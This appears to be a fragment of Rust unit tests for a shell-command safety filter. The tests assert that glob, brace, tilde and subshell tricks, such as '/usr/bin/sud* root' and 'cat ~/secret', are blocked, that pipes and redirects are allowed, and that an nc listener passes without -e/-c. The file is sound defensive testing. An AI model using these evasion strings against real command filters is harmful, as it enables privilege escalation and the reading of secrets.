        assert!(argv_ok("git", &["commit", "-m", "node -e fix"]));
        assert!(argv_ok("nc", &["-l", "8080"])); // listener (no -e/-c)
        assert!(argv_ok("dd", &["--version"])); // no if=/of=
    }

    // ── shell-mode expansion/glob refusal (review P1) ────────────────

    #[test]
    fn shell_mode_refuses_glob_brace_tilde_subshell() {
        // Runtime expansion reconstructs a blocked program past the static scan
        // (`/usr/bin/sud*` → sudo) — the same TOCTOU class as `${IFS}`.
        assert!(shell_blocked("/usr/bin/sud* root")); // glob → sudo
        assert!(shell_blocked("/sbin/rebo*")); // glob → reboot
        assert!(shell_blocked("echo {a,b}")); // brace
        assert!(shell_blocked("cat ~/secret")); // tilde
        assert!(shell_blocked("(reboot)")); // sub-shell
        assert!(shell_blocked("ls ?")); // single-char glob
    }

    #[test]
    fn shell_mode_still_allows_pipes_and_redirects() {
        // Pipes/redirects are NOT expansion — the genuine-pipeline use case the
        // architecture preserves stays allowed.
        assert!(check_shell_mode("cat a.log | grep error").is_ok());
        assert!(check_shell_mode("echo hi > out.txt").is_ok());
        assert!(check_shell_mode("sort < in.txt").is_ok());
    }
}
